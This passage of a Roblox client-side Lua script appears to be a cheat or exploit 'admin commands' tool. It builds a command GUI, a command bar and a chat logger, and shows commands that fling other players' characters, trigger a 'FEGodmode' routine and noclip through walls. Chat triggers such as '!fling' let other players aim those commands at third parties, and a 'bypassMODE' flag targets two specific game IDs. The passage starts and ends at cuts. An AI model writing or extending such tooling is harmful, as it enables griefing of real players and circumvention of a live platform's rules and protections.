CMDS_GUI_V2.Name = "CMDS_GUI_V2"
CMDS_GUI_V2.Parent = game.Players.LocalPlayer.PlayerGui
CMDS_GUI_V2.ResetOnSpawn = false
CMDSmain.Name = "CMDSmain"
CMDSmain.Parent = CMDS_GUI_V2
CMDSmain.BackgroundColor3 = Color3.new(1, 1, 1)
CMDSmain.BackgroundTransparency = 1
CMDSmain.Position = UDim2.new(0, 695, 0, 297)
CMDSmain.Size = UDim2.new(0, 440, 0, 367)
CMDSmain.AnchorPoint = Vector2.new(0.5, 0.5)
CMDSmain.Visible = false
CMDSmain.ClipsDescendants = true
CMDSframemain.Name = "CMDSframemain"
CMDSframemain.Parent = CMDSmain
CMDSframemain.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
CMDSframemain.BorderSizePixel = 0
CMDSframemain.Size = UDim2.new(0, 440, 0, 367)
cmdgui_topframe.Name = "cmdgui_topframe"
cmdgui_topframe.Parent = CMDSframemain
cmdgui_topframe.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
cmdgui_topframe.BorderSizePixel = 0
cmdgui_topframe.Size = UDim2.new(0, 440, 0, 15)
closecmdsgui.Name = "closecmdsgui"
closecmdsgui.Parent = cmdgui_topframe
closecmdsgui.BackgroundColor3 = Color3.new(1, 1, 1)
closecmdsgui.BackgroundTransparency = 1
closecmdsgui.Position = UDim2.new(0, 410, 0, 0)
closecmdsgui.Size = UDim2.new(0, 30, 0, 15)
closecmdsgui.Font = Enum.Font.SourceSansBold
closecmdsgui.Text = "X"
closecmdsgui.TextColor3 = Color3.new(0.968628, 0.968628, 0.968628)
closecmdsgui.TextSize = 20
cmdgui_midframe.Name = "cmdgui_midframe"
cmdgui_midframe.Parent = CMDSframemain
cmdgui_midframe.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
cmdgui_midframe.BorderSizePixel = 0
cmdgui_midframe.Position = UDim2.new(0, 0, 0, 15)
cmdgui_midframe.Size = UDim2.new(0, 440, 0, 45)
cmdsgui_SearchFunction.Name = "cmdsgui_SearchFunction"
cmdsgui_SearchFunction.Parent = cmdgui_midframe
cmdsgui_SearchFunction.BackgroundColor3 = Color3.new(1, 1, 1)
cmdsgui_SearchFunction.BackgroundTransparency = 1
cmdsgui_SearchFunction.BorderSizePixel = 0
cmdsgui_SearchFunction.Position = UDim2.new(0, 120, 0, 10)
cmdsgui_SearchFunction.Size = UDim2.new(0, 200, 0, 25)
cmdsgui_SearchFunction.Font = Enum.Font.SourceSans
cmdsgui_SearchFunction.Text = ""
cmdsgui_SearchFunction.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
cmdsgui_SearchFunction.TextScaled = true
cmdsgui_SearchFunction.TextSize = 14
cmdsgui_SearchFunction.TextWrapped = true
cmdsgui_searchDETAILFRAME.Name = "cmdsgui_searchDETAILFRAME"
cmdsgui_searchDETAILFRAME.Parent = cmdsgui_SearchFunction
cmdsgui_searchDETAILFRAME.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILFRAME.BorderSizePixel = 0
cmdsgui_searchDETAILFRAME.Position = UDim2.new(0, 0, 0, 25)
cmdsgui_searchDETAILFRAME.Size = UDim2.new(0, 200, 0, 2)
cmdsgui_searchDETAILTEXT.Name = "cmdsgui_searchDETAILTEXT"
cmdsgui_searchDETAILTEXT.Parent = cmdsgui_SearchFunction
cmdsgui_searchDETAILTEXT.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILTEXT.BackgroundTransparency = 1
cmdsgui_searchDETAILTEXT.Size = UDim2.new(0, 200, 0, 25)
cmdsgui_searchDETAILTEXT.Font = Enum.Font.SourceSansLight
cmdsgui_searchDETAILTEXT.Text = "Search"
cmdsgui_searchDETAILTEXT.TextColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILTEXT.TextSize = 30
ListofCMDS.Name = "ListofCMDS"
ListofCMDS.Parent = CMDSframemain
ListofCMDS.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
ListofCMDS.BorderSizePixel = 0
ListofCMDS.Position = UDim2.new(0, 0, 0, 60)
ListofCMDS.Size = UDim2.new(0, 440, 0, 307)
ListofCMDS.CanvasSize = UDim2.new(5, 0, 8, 0)
ListofCMDS.ScrollingDirection = Enum.ScrollingDirection.XY
cmdTutorial.Name = "cmdTutorial"
cmdTutorial.Parent = ListofCMDS
cmdTutorial.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial.BackgroundTransparency = 1
cmdTutorial.BorderSizePixel = 0
cmdTutorial.Position = UDim2.new(0, 5, 0, 5)
cmdTutorial.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial.Font = Enum.Font.SourceSansBold
cmdTutorial.Text = "\"/\" means OPTIONAL argument after"
cmdTutorial.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial.TextScaled = true
cmdTutorial.TextSize = 14
cmdTutorial.TextWrapped = true
cmdTutorial.TextXAlignment = Enum.TextXAlignment.Left
cmdTutorial_2.Name = "cmdTutorial"
cmdTutorial_2.Parent = ListofCMDS
cmdTutorial_2.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial_2.BackgroundTransparency = 1
cmdTutorial_2.BorderSizePixel = 0
cmdTutorial_2.Position = UDim2.new(0, 5, 0, 25)
cmdTutorial_2.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial_2.Font = Enum.Font.SourceSansBold
cmdTutorial_2.Text = "\"//\" means another way of running command"
cmdTutorial_2.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial_2.TextScaled = true
cmdTutorial_2.TextSize = 14
cmdTutorial_2.TextWrapped = true
cmdTutorial_2.TextXAlignment = Enum.TextXAlignment.Left
cmdTutorial_3.Name = "cmdTutorial"
cmdTutorial_3.Parent = ListofCMDS
cmdTutorial_3.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial_3.BackgroundTransparency = 1
cmdTutorial_3.BorderSizePixel = 0
cmdTutorial_3.Position = UDim2.new(0, 5, 0, 45)
cmdTutorial_3.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial_3.Font = Enum.Font.SourceSansBold
cmdTutorial_3.Text = "Anything inside \"[ ]\" is an argument for the command"
cmdTutorial_3.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial_3.TextScaled = true
cmdTutorial_3.TextSize = 14
cmdTutorial_3.TextWrapped = true
cmdTutorial_3.TextXAlignment = Enum.TextXAlignment.Left
CMDS_Shadow.Name = "CMDS_Shadow"
CMDS_Shadow.Parent = CMDSmain
CMDS_Shadow.BackgroundColor3 = Color3.new(0, 0, 0)
CMDS_Shadow.BackgroundTransparency = 0.60000002384186
CMDS_Shadow.BorderSizePixel = 0
CMDS_Shadow.Position = UDim2.new(0, 2, 0, 2)
CMDS_Shadow.Size = UDim2.new(0, 440, 0, 367)
CMDS_Shadow.ZIndex = -1
CMDS_Shadow2.Name = "CMDS_Shadow2"
CMDS_Shadow2.Parent = CMDSmain
CMDS_Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
CMDS_Shadow2.BackgroundTransparency = 0.80000001192093
CMDS_Shadow2.BorderSizePixel = 0
CMDS_Shadow2.Position = UDim2.new(0, 5, 0, 5)
CMDS_Shadow2.Size = UDim2.new(0, 440, 0, 367)
CMDS_Shadow2.ZIndex = -1
closecmdsgui.MouseButton1Click:Connect(function()
 CMDSmain:TweenSize(UDim2.new(0, 0, 0, 0), "InOut", "Sine", 2)
end)
function CreateCMDlabel(position, text)
 local sizenow = 15
 local cmdHere = Instance.new("TextLabel")
 cmdHere.Name = "cmdHere"
 cmdHere.TextWrapped = true
 cmdHere.Parent = ListofCMDS
 cmdHere.BackgroundColor3 = Color3.new(1, 1, 1)
 cmdHere.BackgroundTransparency = 1
 cmdHere.BorderSizePixel = 0
 cmdHere.Position = position
 cmdHere.Size = UDim2.new(0, 1950, 0, sizenow)
 cmdHere.Font = Enum.Font.SourceSans
 cmdHere.Text = text
 cmdHere.TextWrapped = true
 cmdHere.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
 cmdHere.TextScaled = false
 cmdHere.TextSize = 20
 cmdHere.TextXAlignment = Enum.TextXAlignment.Left
end
for i,_cmds in pairs(searchCmds) do
 CreateCMDlabel(UDim2.new(0, 5, 0, 50 + (i * 15)), _cmds)
end
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function updateCMDS(input)
 local delta = input.Position - dragStart
 local dragTime = 0.055
 local SmoothDrag = {}
 SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 local dragSmoothFunction = gsTween:Create(CMDSmain, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
 dragSmoothFunction:Play()
end
cmdgui_topframe.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
  dragging = true
  dragStart = input.Position
  startPos = CMDSmain.Position
  input.Changed:Connect(function()
   if input.UserInputState == Enum.UserInputState.End then
    dragging = false
   end
  end)
 end
end)
cmdgui_topframe.InputChanged:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
  dragInput = input
 end
end)
cmdgui_midframe.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
  dragging = true
  dragStart = input.Position
  startPos = CMDSmain.Position
  input.Changed:Connect(function()
   if input.UserInputState == Enum.UserInputState.End then
    dragging = false
   end
  end)
 end
end)
cmdgui_midframe.InputChanged:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
  dragInput = input
 end
end)
UserInputService.InputChanged:Connect(function(input)
 if input == dragInput and dragging then
  updateCMDS(input)
 end
end)
cmdsgui_SearchFunction.Focused:Connect(function()
 cmdsgui_SearchFunction.TextTransparency = 0
 local searchTween = {}
 searchTween.TextColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
 searchTween.TextSize = 18
 searchTween.Position = UDim2.new(0, -70, 0, -15)
 local frameTweenblue = {}
 frameTweenblue.BackgroundColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
 local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
 searchTween1:Play()
 local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
 frameTweenblue1:Play()
end)
cmdsgui_SearchFunction.FocusLost:Connect(function(enterPressed)
 if not enterPressed then
  cmdsgui_SearchFunction.TextTransparency = 1
 else
  cmdsgui_SearchFunction.Text = " "
 end
 local searchTween = {}
 searchTween.TextColor3 = Color3.fromRGB(240, 240, 240)
 searchTween.TextSize = 30
 searchTween.Position = UDim2.new(0, 0, 0, 0)
 local frameTweenblue = {}
 frameTweenblue.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
 local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
 searchTween1:Play()
 local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
 frameTweenblue1:Play()
end)
cmdsgui_SearchFunction.Changed:Connect(function()
 local index = 0
 if cmdsgui_SearchFunction.Text ~= "" then
  for i,v in pairs(ListofCMDS:GetChildren()) do
   if v.Name == "cmdHere" then
    if not string.find(v.Text, cmdsgui_SearchFunction.Text) then
     v.Visible = false
    else
     v.Visible = true
     index = index + 1
     v.Position = UDim2.new(0, 5, 0, 50 + (index * 15))
    end
   end
  end
 end
end)

-- Command Execution
LP.Chatted:Connect(function(chat)
 run(chat)
end)

function run(msg)
 if string.lower(string.sub(msg, 2, 5)) == "chat" then
  msg = msg
 elseif string.match(msg, "hotkey") and string.match(msg, "chat") then
  msg = msg
 else
  msg = string.lower(msg)
 end
 local cmdPrefix = string.sub(msg, 1, 1)
 if cmdPrefix == commandPrefix then
  msg = string.sub(msg, 2)
  local args = {}
  for arg in string.gmatch(msg,"[^%s]+") do
   table.insert(args,arg)
  end
  local cmdName = args[1]
  table.remove(args,1)
  local doCmd = Commands[cmdName]
  
  if doCmd ~= nil then
   doCmd(args)
  end
 end
end

-- Command bar
local CommandBar = Instance.new("ScreenGui")
local CMDBAR = Instance.new("Frame")
local CMDBARText = Instance.new("TextBox")
CommandBar.Name = "CommandBar"
CommandBar.Parent = game.Players.LocalPlayer.PlayerGui
CommandBar.ResetOnSpawn = false
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = CommandBar
CMDBAR.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
CMDBAR.BorderSizePixel = 0
CMDBAR.Position = UDim2.new(0.025, 0, 1, 0)
CMDBAR.Size = UDim2.new(0, 270, 0, 35)
CMDBARText.Name = "CMDBARText"
CMDBARText.Parent = CMDBAR
CMDBARText.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
CMDBARText.BorderSizePixel = 0
CMDBARText.Position = UDim2.new(0, 5, 0, 5)
CMDBARText.Size = UDim2.new(0, 260, 0, 25)
CMDBARText.Font = Enum.Font.SourceSansLight
CMDBARText.Text = ""
CMDBARText.TextColor3 = Color3.new(0.933333, 0.933333, 0.933333)
CMDBARText.TextScaled = true
CMDBARText.TextSize = 14
CMDBARText.TextWrapped = true
Mouse.KeyDown:connect(function(Key)
 if Key == string.lower(commandPrefix) then
  CMDBARText:CaptureFocus()
  CMDBAR:TweenPosition(UDim2.new(0.015, 0, 0.95, 0), "Out", "Elastic", 0.5, true)
 end
end)
CMDBARText.FocusLost:connect(function(enterPressed)
 CMDBAR:TweenPosition(UDim2.new(0.015, 0, 1, 0), "Out", "Quad", 0.5, true)
 if enterPressed then
  local cmdmsg = CMDBARText.Text
  CMDBARText.Text = ""
  run(commandPrefix..cmdmsg)
 end
end)
local Match = Instance.new("Frame")
Match.Name = "Match"
Match.Parent = CMDBAR
Match.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
Match.BorderSizePixel = 0
Match.Position = UDim2.new(0, 0, -4, 0)
Match.Size = UDim2.new(1, 0, 4, 0)
Match.Visible = false
function CreateOption(Text)
 local Option1 = Instance.new("TextLabel")
 Option1.Name = "Option"
 Option1.Parent = Match
 Option1.BackgroundColor3 = Color3.new(1, 1, 1)
 Option1.BackgroundTransparency = 1
 Option1.Position = UDim2.new(-10, 0, 0, 0)
 Option1.Size = UDim2.new(1, 0, 0, 20)
 Option1.Font = Enum.Font.SourceSans
 Option1.Text = Text
 Option1.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
 Option1.TextScaled = true
 Option1.TextWrapped = true
end
for i,cmdtext2 in pairs(CMDS) do
 CreateOption(cmdtext2)
end
CMDBARText.Changed:Connect(function()
 if CMDBARText.Text ~= "" and CMDBARText.Text ~= commandPrefix then
  Match.Visible = true
  local PositionMatch = 0
  for i,cmdtext in pairs(Match:GetChildren()) do
   if cmdtext.Name == "Option" then
    if string.find(cmdtext.Text, CMDBARText.Text) then
     cmdtext.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
     PositionMatch = PositionMatch + 1
     if cmdtext.Position == UDim2.new(0, 0, 0, 142) then
      cmdtext.Position = UDim2.new(-10, 0, 0, 0)
      PositionMatch = PositionMatch - 1
     end
    else
     cmdtext.Position = UDim2.new(-10, 0, 0, 0)
    end
   end
  end
 else
  Match.Visible = false
 end
end)

-- Chat
local ChatLogsv2 = Instance.new("ScreenGui")
local MainChatFrame = Instance.new("Frame")
local Framess = Instance.new("Frame")
local CloseChatGUI = Instance.new("TextButton")
local Frame_222 = Instance.new("Frame")
local PrintChat = Instance.new("TextButton")
local Shadow1 = Instance.new("Frame")
local Shadow2 = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
ChatLogsv2.Name = "ChatLogsv2"
ChatLogsv2.Parent = game.Players.LocalPlayer.PlayerGui
ChatLogsv2.ResetOnSpawn = false
MainChatFrame.Name = "MainChatFrame"
MainChatFrame.Parent = ChatLogsv2
MainChatFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainChatFrame.BackgroundTransparency = 1
MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
MainChatFrame.Size = UDim2.new(0, 525, 0, 337)
MainChatFrame.Visible = false
Framess.Parent = MainChatFrame
Framess.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Framess.BorderSizePixel = 0
Framess.Size = UDim2.new(0, 525, 0, 15)
CloseChatGUI.Name = "CloseChatGUI"
CloseChatGUI.Parent = Framess
CloseChatGUI.BackgroundColor3 = Color3.new(1, 1, 1)
CloseChatGUI.BackgroundTransparency = 1
CloseChatGUI.BorderSizePixel = 0
CloseChatGUI.Position = UDim2.new(0, 495, 0, 0)
CloseChatGUI.Size = UDim2.new(0, 30, 0, 15)
CloseChatGUI.Font = Enum.Font.SourceSansBold
CloseChatGUI.Text = "X"
CloseChatGUI.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CloseChatGUI.TextSize = 20
Frame_222.Parent = MainChatFrame
Frame_222.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
Frame_222.BorderSizePixel = 0
Frame_222.Position = UDim2.new(0, 0, 0, 15)
Frame_222.Size = UDim2.new(0, 525, 0, 50)
PrintChat.Name = "PrintChat"
PrintChat.Parent = Frame_222
PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
PrintChat.BorderSizePixel = 0
PrintChat.Position = UDim2.new(0, 15, 0, 0)
PrintChat.Size = UDim2.new(0, 170, 0, 30)
PrintChat.Font = Enum.Font.SourceSansLight
PrintChat.Text = "Print Chat"
PrintChat.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
PrintChat.TextSize = 30
PrintChat.TextWrapped = true
Shadow1.Name = "Shadow1"
Shadow1.Parent = MainChatFrame
Shadow1.BackgroundColor3 = Color3.new(0, 0, 0)
Shadow1.BackgroundTransparency = 0.5
Shadow1.Position = UDim2.new(0, 2, 0, 2)
Shadow1.Size = UDim2.new(0, 525, 0, 337)
Shadow1.ZIndex = -1
Shadow2.Name = "Shadow2"
Shadow2.Parent = MainChatFrame
Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
Shadow2.BackgroundTransparency = 0.80000001192093
Shadow2.Position = UDim2.new(0, 5, 0, 5)
Shadow2.Size = UDim2.new(0, 525, 0, 337)
Shadow2.ZIndex = -1
ScrollingFrame.Parent = MainChatFrame
ScrollingFrame.BackgroundColor3 = Color3.new(0.266667, 0.266667, 0.266667)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0, 0, 0, 65)
ScrollingFrame.Size = UDim2.new(0, 525, 0, 271)
ScrollingFrame.CanvasPosition = Vector2.new(0, 403)
ScrollingFrame.ScrollBarThickness = 8
function CreateChatText(plr, chat)
 for i,v in pairs(ScrollingFrame:GetDescendants()) do
  v.Position = v.Position - UDim2.new(0, 0, 0, 20)
  if v.Position == UDim2.new(0, 5, 0, 10) then
   v:Destroy()
  end
 end
 local Example = Instance.new("TextLabel")
 Example.Name = "Example"
 Example.Parent = ScrollingFrame
 Example.BackgroundColor3 = Color3.new(1, 1, 1)
 Example.BackgroundTransparency = 1
 Example.Position = UDim2.new(0, 5, 0, 650)
 Example.Size = UDim2.new(0, 500, 0, 20)
 Example.Font = Enum.Font.SourceSans
 Example.Text = "["..plr.Name.."]: "..chat
 Example.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
 Example.TextScaled = true
 Example.TextSize = 20
 Example.TextWrapped = true
 Example.TextXAlignment = Enum.TextXAlignment.Left
end
CloseChatGUI.MouseButton1Click:Connect(function()
 MainChatFrame:TweenPosition(UDim2.new(0, 550, 0, -550), "InOut", "Sine", 2)
 wait(2.01)
 MainChatFrame.Visible = false
end)
printingChat = false
PrintChat.MouseButton1Click:Connect(function()
 if printingChat == false then
  printingChat = true
  PrintChat.BackgroundColor3 = Color3.fromRGB(60, 200, 60)
 elseif printingChat == true then
  printingChat = false
  PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
 end
end)
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function updateChat(input)
 local delta = input.Position - dragStart
 local dragTime = 0.055
 local SmoothDrag = {}
 SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
 local dragSmoothFunction = gsTween:Create(MainChatFrame, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
 dragSmoothFunction:Play()
end
Frame_222.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
  dragging = true
  dragStart = input.Position
  startPos = MainChatFrame.Position
  input.Changed:Connect(function()
   if input.UserInputState == Enum.UserInputState.End then
    dragging = false
   end
  end)
 end
end)
Frame_222.InputChanged:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
  dragInput = input
 end
end)
UserInputService.InputChanged:Connect(function(input)
 if input == dragInput and dragging then
  updateChat(input)
 end
end)

function printChat(player, chat)
 print("["..player.Name.."]: "..chat)
end
complimentReady = true
for i,currentPlayersChatting in pairs(game:GetService("Players"):GetPlayers()) do
 currentPlayersChatting.Chatted:connect(function(chat)
  CreateChatText(currentPlayersChatting, chat)
  if printingChat then
   printChat(currentPlayersChatting, chat)
  end
  if copychatACTIVE then
   if currentPlayersChatting == copychatplayer then
    gsReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(chat, "All")
   end
  end
  if modeFling == true then
   if string.lower(string.sub(chat, 1, 7)) == "!fling " then
    if gsWorkspace:PGSIsEnabled() == false then
     FEGodmode()
    end
    if string.lower(string.sub(chat, 8)) == "me" then
     run(commandPrefix.."unfling")
     LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
     run(commandPrefix.."fling "..currentPlayersChatting.Name.." 2000000")
    else
     for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
      if notAll ~= LP then
       run(commandPrefix.."unfling")
       LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
       run(commandPrefix.."fling "..notAll.Name.." 2000000")
      end
     end
    end
   end
  end
  if modeCompliment == true then
   if string.lower(string.sub(chat, 1, 3)) == "!c " then
    if complimentReady then
     complimentReady = false
     if string.lower(string.sub(chat, 4)) == "me" then
      complimentplr(currentPlayersChatting)
     else
      for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
       if Others == LP then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
       else
        complimentplr(Others)
       end
      end
     end
     wait(1)
     complimentReady = true
    end
   end
  end
  if modeMove == true then
   if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
    run(commandPrefix.."unfollow")
    run(commandPrefix.."unwalk")
    run(commandPrefix.."goto "..currentPlayersChatting.Name)
   elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
    for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
     if getWalkPlayer == LP then
      run(commandPrefix.."unfollow")
      run(commandPrefix.."walk "..currentPlayersChatting.Name)
     else
      run(commandPrefix.."unfollow")
      run(commandPrefix.."walk "..getWalkPlayer.Name)
     end
    end
   elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
    for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
     if getFollowPlayer == LP then
      run(commandPrefix.."unwalk")
      run(commandPrefix.."follow "..currentPlayersChatting.Name)
     else
      run(commandPrefix.."unwalk")
      run(commandPrefix.."follow "..getFollowPlayer.Name)
     end
    end
   end
  end
  if modeInfo == true then
   if infoReady then
    infoReady = false
    if string.lower(string.sub(chat, 1, 5)) == "!age " then
     for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
      if v == LP then
       run(commandPrefix.."age "..currentPlayersChatting.Name)
      else
       run(commandPrefix.."age "..v.Name)
      end
     end
    end
    if string.lower(string.sub(chat, 1, 4)) == "!id " then
     for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
      if a == LP then
       run(commandPrefix.."id "..currentPlayersChatting.Name)
      else
       run(commandPrefix.."id "..a.Name)
      end
     end
    end
    wait(1)
    infoReady = true
   end
  end
 end)
end
game:GetService("Players").PlayerAdded:connect(function(plr)
 plr.Chatted:connect(function(chat)
  CreateChatText(plr, chat)
  if printingChat then
   printChat(plr, chat)
  end
  if modeFling == true then
   if string.lower(string.sub(chat, 1, 7)) == "!fling " then
    if gsWorkspace:PGSIsEnabled() == false then
     FEGodmode()
    end
    if string.lower(string.sub(chat, 8)) == "me" then
     run(commandPrefix.."unfling")
     LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
     run(commandPrefix.."fling "..plr.Name.." 2000000")
    else
     for i,notAll in pairs(findSinglePlayer(string.lower(string.sub(chat, 8)))) do
      if notAll ~= LP then
       run(commandPrefix.."unfling")
       LP.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + Vector3.new(0, 10, 0)
       run(commandPrefix.."fling "..notAll.Name.." 2000000")
      end
     end
    end
   end
  end
  if modeCompliment == true then
   if string.lower(string.sub(chat, 1, 3)) == "!c " then
    if complimentReady == true then
     complimentReady = false
     if string.lower(string.sub(chat, 4)) == "me" then
      complimentplr(plr)
     else
      for i,Others in pairs(findSinglePlayer(string.lower(string.sub(chat, 4)))) do
       if Others == LP then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Don't be silly, I can't compliment myself!", "All")
       else
        complimentplr(Others)
       end
      end
     end
     wait(1)
     complimentReady = true
    end
   end
  end
  if modeMove == true then
   if string.lower(string.sub(chat, 1, 9)) == "!bringbot" then
    run(commandPrefix.."unfollow")
    run(commandPrefix.."unwalk")
    run(commandPrefix.."goto "..plr.Name)
   elseif string.lower(string.sub(chat, 1, 6)) == "!walk " then
    for i,getWalkPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 7)))) do
     if getWalkPlayer == LP then
      run(commandPrefix.."unfollow")
      run(commandPrefix.."walk "..plr.Name)
     else
      run(commandPrefix.."unfollow")
      run(commandPrefix.."walk "..getWalkPlayer.Name)
     end
    end
   elseif string.lower(string.sub(chat, 1, 8)) == "!follow " then
    for i,getFollowPlayer in pairs(findSinglePlayer(string.lower(string.sub(chat, 9)))) do
     if getFollowPlayer == LP then
      run(commandPrefix.."unwalk")
      run(commandPrefix.."follow "..plr.Name)
     else
      run(commandPrefix.."unwalk")
      run(commandPrefix.."follow "..getFollowPlayer.Name)
     end
    end
   end
  end
  if modeInfo == true then
   if infoReady then
    infoReady = false
    if string.lower(string.sub(chat, 1, 5)) == "!age " then
     for i,v in pairs(findSinglePlayer(string.lower(string.sub(chat, 6)))) do
      if v == LP then
       run(commandPrefix.."age "..plr.Name)
      else
       run(commandPrefix.."age "..v.Name)
      end
     end
    end
    if string.lower(string.sub(chat, 1, 4)) == "!id " then
     for i,a in pairs(findSinglePlayer(string.lower(string.sub(chat, 5)))) do
      if a == LP then
       run(commandPrefix.."id "..plr.Name)
      else
       run(commandPrefix.."id "..a.Name)
      end
     end
    end
    wait(1)
    infoReady = true
   end
  end
 end)
end)

-- Loops
noclip = false
following = false
trailing = false
annoying = false
flingnoclip = false
staring = false
stopsitting = false
stareplr = ""
CBRINGamount = 3
spawnWS = CurrentWalkspeed
spawnJP = CurrentJumppower
spawnHH = CurrentHipheight
spawningfegod = false
looptpbypassfly = false
if game.GameId == 245662005 or game.GameId == 601130232 then
 bypassMODE = true
else
 bypassMODE = false
end
viewplr = ""
loopview = false
cmdForward = false
forwardSpeed = 1
loopviewfc = false
spinTOhead = false
spinObj = ""
rideACTIVE = false
ridePLAYER = ""

LPcurrenthumanoid = LP.Character.Humanoid
game:GetService('RunService').Stepped:connect(function()
 if LP.Character.Humanoid ~= nil then
  LPcurrenthumanoid = LP.Character.Humanoid
 end
 if noclip then
  if LP.Character then
   if LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
    LP.Character.Head.CanCollide = false
    LP.Character.Torso.CanCollide = false
    LP.Character["Left Leg"].CanCollide = false
    LP.Character["Right Leg"].CanCollide = false
    LP.Character["Left Arm"].CanCollide = false
    LP.Character["Right Arm"].CanCollide = false
   elseif LP.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
    LP.Character.Head.CanCollide = false
    LP.Character.UpperTorso.CanCollide = false
    LP.Character.LowerTorso.CanCollide = false
    LP.Character.HumanoidRootPart.CanCollide = false
   end
  end
 end
 if following then
  LP.Character.HumanoidRootPart.CFrame = gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame + gsPlayers[flwplr.Name].Character.HumanoidRootPart.CFrame.lookVector * flwnum
 end
 if trailing then
